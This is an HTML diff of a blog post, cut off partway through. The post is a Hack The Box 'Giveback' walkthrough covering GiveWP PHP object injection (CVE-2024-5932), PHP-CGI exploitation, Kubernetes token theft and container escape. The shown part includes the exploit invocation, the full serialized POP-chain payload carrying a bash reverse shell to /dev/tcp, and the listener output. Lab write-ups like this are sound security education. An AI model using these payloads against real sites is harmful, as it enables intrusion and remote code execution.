@@ -1,0 +1,891 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2026/02/23/hackthebox-giveback/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewGiveBack is a medium-difficulty Hack The Box machine that starts with a WordPress 6.8.1 site running the vulnerable GiveWP donation plugin, exploitable via CVE-2024-5932 (unauthenticated PHP O">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: Giveback">
+<meta property="og:url" content="http://fouedsaidi.com/2026/02/23/Hackthebox-Giveback/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewGiveBack is a medium-difficulty Hack The Box machine that starts with a WordPress 6.8.1 site running the vulnerable GiveWP donation plugin, exploitable via CVE-2024-5932 (unauthenticated PHP O">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-02-23T14:06:50.000Z">
+<meta property="article:modified_time" content="2026-02-23T16:05:36.599Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CVE-2024-5932">
+<meta property="article:tag" content="CVE-2024-4577">
+<meta property="article:tag" content="WordPress">
+<meta property="article:tag" content="GiveWP">
+<meta property="article:tag" content="PHP Object Injection">
+<meta property="article:tag" content="PHP-CGI">
+<meta property="article:tag" content="Kubernetes">
+<meta property="article:tag" content="Container Escape">
+<meta property="article:tag" content="runc">
+<meta name="twitter:card" content="summary">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: Giveback -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":null,"zhihu":null,"twitter":"https://twitter.com/_kujen5","email":null,"linkedin":"https://www.linkedin.com/in/foued-saidi-pro/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Giveback</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-02-23 17:06:50</span>
+        <span class="mobile">2026-02-23 17:06:50</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-02-23 19:05:36</span>
+            <span class="mobile">2026-02-23 19:05:36</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/CVE-2024-5932/">CVE-2024-5932</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/CVE-2024-4577/">CVE-2024-4577</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/WordPress/">WordPress</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/GiveWP/">GiveWP</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/PHP-Object-Injection/">PHP Object Injection</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/PHP-CGI/">PHP-CGI</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Kubernetes/">Kubernetes</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Container-Escape/">Container Escape</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/runc/">runc</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>GiveBack is a medium-difficulty Hack The Box machine that starts with a WordPress 6.8.1 site running the vulnerable GiveWP donation plugin, exploitable via CVE-2024-5932 (unauthenticated PHP Object Injection) to get a reverse shell inside a Kubernetes pod. From inside the pod we discover an internal legacy CMS service with PHP-CGI exposed, exploit it via CVE-2024-4577 to get root in a second container, steal the mounted Kubernetes service account token (<code>secret-reader-sa</code>), dump cluster secrets containing a master password, and SSH into the host as <code>babywyrm</code>. For root, we abuse <code>sudo /opt/debug</code> — an OCI container runtime — by crafting a config that bind-mounts <code>/root</code> from the host and reads the flag.</p>
+<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   256 66:f8:9c:58:f4:b8:59:bd:cd:ec:92:24:c3:97:8e:9e (ECDSA)</span><br><span class="line">|_  256 96:31:8a:82:1a:65:9f:0a:a2:6c:ff:4d:44:7c:d3:94 (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.28.0</span><br><span class="line">|_http-server-header: nginx/1.28.0</span><br><span class="line">| http-robots.txt: 1 disallowed entry</span><br><span class="line">|_/wp-admin/</span><br><span class="line">|_http-generator: WordPress 6.8.1</span><br><span class="line">|_http-title: GIVING BACK IS WHAT MATTERS MOST &amp;#8211; OBVI</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.19</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 111/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   745.73 ms 10.10.16.1</span><br><span class="line">2   424.32 ms 10.129.183.181</span><br></pre></td></tr></table></figure></div>
+
+<p>SSH on port 22, nginx on port 80 serving WordPress 6.8.1. Enumerating the WordPress installation reveals the <strong>GiveWP</strong> donation plugin is active.</p>
+<h2 id="Foothold-CVE-2024-5932-GiveWP-PHP-Object-Injection"><a href="#Foothold-CVE-2024-5932-GiveWP-PHP-Object-Injection" class="headerlink" title="Foothold - CVE-2024-5932 (GiveWP PHP Object Injection)"></a>Foothold - CVE-2024-5932 (GiveWP PHP Object Injection)</h2><p>GiveWP versions up to and including 3.14.1 are vulnerable to <a class="link"   target="_blank" rel="noopener" href="https://github.com/EQSTLab/CVE-2024-5932" >CVE-2024-5932 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> — an unauthenticated PHP Object Injection via the <code>give_title</code> parameter during donation processing. A POP chain exists that allows full RCE.</p>
+<p>We use the public exploit from <a class="link"   target="_blank" rel="noopener" href="https://github.com/EQSTLab/CVE-2024-5932" >EQSTLab <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/CVE-2024-5932]</span><br><span class="line">└─$ python3 CVE-2024-5932-rce.py -u http://10.129.183.181/donations/the-things-we-need/ -c &quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.16.7/9001 0&gt;&amp;1&#x27;&quot;</span><br><span class="line"></span><br><span class="line">             ..-+*******-</span><br><span class="line">            .=#+-------=@.                        .:==:.</span><br><span class="line">           .**-------=*+:                      .-=++.-+=:.</span><br><span class="line">           +*-------=#=+++++++++=:..          -+:==**=+-+:.</span><br><span class="line">          .%----=+**+=-:::::::::-=+**+:.      ==:=*=-==+=..</span><br><span class="line">          :%--**+-::::::::::::::::::::+*=:     .::*=**=:.</span><br><span class="line">   ..-++++*@#+-:::::::::::::::::::::::::-*+.    ..-+:.</span><br><span class="line"> ..+*+---=#+::::::::::::::::::::::::::::::=*:..-==-.</span><br><span class="line"> .-#=---**:::::::::::::::::::::::::=+++-:::-#:..            :=+++++++==.   ..-======-.     ..:---:..</span><br><span class="line">  ..=**#=::::::::::::::::::::::::::::::::::::%:.           *@@@@@@@@@@@@:.-#@@@@@@@@@%*:.-*%@@@@@@@%#=.</span><br><span class="line">   .=#%=::::::::::::::::::::::::::::::::-::::-#.           %@@@@@@@@@@@@+:%@@@@@@@@@@@%==%@@@@@@@@@@@%-</span><br><span class="line">  .*+*+:::::::::::-=-::::::::::::::::-*#*=::::#: ..*#*+:.  =++++***%@@@@+-@@@#====%@@@%==@@@#++++%@@@%-</span><br><span class="line">  .+#*-::::::::::+*-::::::::::::::::::+=::::::-#..#+=+*%-.  :=====+#@@@@-=@@@+.  .%@@@%=+@@@+.  .#@@@%-</span><br><span class="line">   .+*::::::::::::::::::::::::+*******=::::::--@.+@#+==#-. #@@@@@@@@@@@@.=@@@%*++*%@@@%=+@@@#====@@@@%-</span><br><span class="line">   .=+:::::::::::::=*+::::::-**=-----=#-::::::-@%+=+*%#:. .@@@@@@@@@@@%=.:%@@@@@@@@@@@#-=%@@@@@@@@@@@#-</span><br><span class="line">   .=*::::::::::::-+**=::::-#+--------+#:::-::#@%*==+*-   .@@@@#=----:.  .-+*#%%%%@@@@#-:+#%@@@@@@@@@#-</span><br><span class="line">   .-*::::::::::::::::::::=#=---------=#:::::-%+=*#%#-.   .@@@@%######*+.       .-%@@@#:  .....:+@@@@*:</span><br><span class="line">    :+=:::::::::::-:-::::-%=----------=#:::--%++++=**      %@@@@@@@@@@@@.        =%@@@#.        =@@@@*.</span><br><span class="line">    .-*-:::::::::::::::::**---------=+#=:::-#**#*+#*.      -#%@@@@@@@@@#.        -%@@%*.        =@@@@+.</span><br><span class="line">.::-==##**-:::-::::::::::%=-----=+***=::::=##+#=.::         ..::----:::.         .-=--.         .=+=-.</span><br><span class="line">%+==--:::=*::::::::::::-:+#**+=**=::::::-#%=:-%.</span><br><span class="line">*+.......+*::::::::::::::::-****-:::::=*=:.++:*=</span><br><span class="line">.%:..::::*@@*-::::::::::::::-+=:::-+#%-.   .#*#.</span><br><span class="line"> ++:.....#--#%**=-:::::::::::-+**+=:@#....-+*=.</span><br><span class="line"> :#:....:#-::%..-*%#++++++%@@@%*+-.#-=#+++-..</span><br><span class="line"> .++....-#:::%.   .-*+-..*=.+@= .=+..-#</span><br><span class="line"> .:+++#@#-:-#= ...   .-++:-%@@=     .:#</span><br><span class="line">     :+++**##@#+=.      -%@@@%-   .-=*#.</span><br><span class="line">    .=+::+::-@:         #@@@@+. :+*=::=*-</span><br><span class="line">    .=+:-**+%%+=-:..    =*#*-..=*-:::::=*</span><br><span class="line">     :++---::--=*#+*+++++**+*+**-::::::+=</span><br><span class="line">      .+*=:::---+*:::::++++++*+=:::::-*=.</span><br><span class="line">       .:=**+====#*::::::=%:...-=++++=.      Author: EQST(Experts, Qualified Security Team)</span><br><span class="line">           ..:----=**++++*+.                 Github: https://github.com/EQSTLab/CVE-2024-5932</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Analysis base : https://www.wordfence.com/blog/2024/08/4998-bounty-awarded-and-100000-wordpress-sites-protected-against-unauthenticated-remote-code-execution-vulnerability-patched-in-givewp-wordpress-plugin/</span><br><span class="line"></span><br><span class="line">=============================================================================================================</span><br><span class="line"></span><br><span class="line">CVE-2024-5932 : GiveWP unauthenticated PHP Object Injection</span><br><span class="line">description: The GiveWP  Donation Plugin and Fundraising Platform plugin for WordPress is vulnerable to PHP Object Injection in all versions up to, and including, 3.14.1 via deserialization of untrusted input from the &#x27;give_title&#x27; parameter. This makes it possible for unauthenticated attackers to inject a PHP Object. The additional presence of a POP chain allows attackers to execute code remotely, and to delete arbitrary files.</span><br><span class="line">Arbitrary File Deletion</span><br><span class="line"></span><br><span class="line">=============================================================================================================</span><br><span class="line"></span><br><span class="line">[\] Exploit loading, please wait...</span><br><span class="line">[+] Requested Data:</span><br><span class="line">&#123;&#x27;give-form-id&#x27;: &#x27;17&#x27;, &#x27;give-form-hash&#x27;: &#x27;c42e59787d&#x27;, &#x27;give-price-id&#x27;: &#x27;0&#x27;, &#x27;give-amount&#x27;: &#x27;$10.00&#x27;, &#x27;give_first&#x27;: &#x27;Linda&#x27;, &#x27;give_last&#x27;: &#x27;Maddox&#x27;, &#x27;give_email&#x27;: &#x27;mooreann@example.net&#x27;, &#x27;give_title&#x27;: &#x27;O:19:&quot;Stripe\\\\\\\\StripeObject&quot;:1:&#123;s:10:&quot;\\0*\\0_values&quot;;a:1:&#123;s:3:&quot;foo&quot;;O:62:&quot;Give\\\\\\\\PaymentGateways\\\\\\\\DataTransferObjects\\\\\\\\GiveInsertPaymentData&quot;:1:&#123;s:8:&quot;userInfo&quot;;a:1:&#123;s:7:&quot;address&quot;;O:4:&quot;Give&quot;:1:&#123;s:12:&quot;\\0*\\0container&quot;;O:33:&quot;Give\\\\\\\\Vendors\\\\\\\\Faker\\\\\\\\ValidGenerator&quot;:3:&#123;s:12:&quot;\\0*\\0validator&quot;;s:10:&quot;shell_exec&quot;;s:12:&quot;\\0*\\0generator&quot;;O:34:&quot;Give\\\\\\\\Onboarding\\\\\\\\SettingsRepository&quot;:1:&#123;s:11:&quot;\\0*\\0settings&quot;;a:1:&#123;s:8:&quot;address1&quot;;s:50:&quot;bash -c \&#x27;bash -i &gt;&amp; /dev/tcp/10.10.16.7/9001 0&gt;&amp;1\&#x27;&quot;;&#125;&#125;s:13:&quot;\\0*\\0maxRetries&quot;;i:10;&#125;&#125;&#125;&#125;&#125;&#125;&#x27;, &#x27;give-gateway&#x27;: &#x27;offline&#x27;, &#x27;action&#x27;: &#x27;give_process_donation&#x27;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>The exploit injects a serialized PHP object chain into the <code>give_title</code> field, threading through <code>Stripe\StripeObject</code> -&gt; <code>GiveInsertPaymentData</code> -&gt; <code>Faker\ValidGenerator</code> with <code>shell_exec</code> as the validator. On our listener:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/CVE-2024-5932]</span><br><span class="line">└─$ rlwrap nc -lvnp 9001</span><br><span class="line">listening on [any] 9001 ...</span><br><span class="line">connect to [10.10.16.7] from (UNKNOWN) [10.129.183.181] 7842</span><br><span class="line">bash: cannot set terminal process group (1): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">&lt;-7bdb994b9d-wbcm8:/opt/bitnami/wordpress/wp-admin$ id</span><br><span class="line">id</span><br><span class="line">uid=1001 gid=0(root) groups=0(root),1001</span><br><span class="line">&lt;-7bdb994b9d-wbcm8:/opt/bitnami/wordpress/wp-admin$</span><br></pre></td></tr></table></figure></div>
+
+<p>The hostname <code>beta-vino-wp-wordpress-7bdb994b9d-wbcm8</code> and the <code>/opt/bitnami/wordpress</code> path confirm we landed in a Bitnami WordPress Kubernetes pod.</p>
+<h2 id="Enumerating-the-Kubernetes-Environment"><a href="#Enumerating-the-Kubernetes-Environment" class="headerlink" title="Enumerating the Kubernetes Environment"></a>Enumerating the Kubernetes Environment</h2><p>Running <code>env</code> dumps a load of Kubernetes service variables:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span 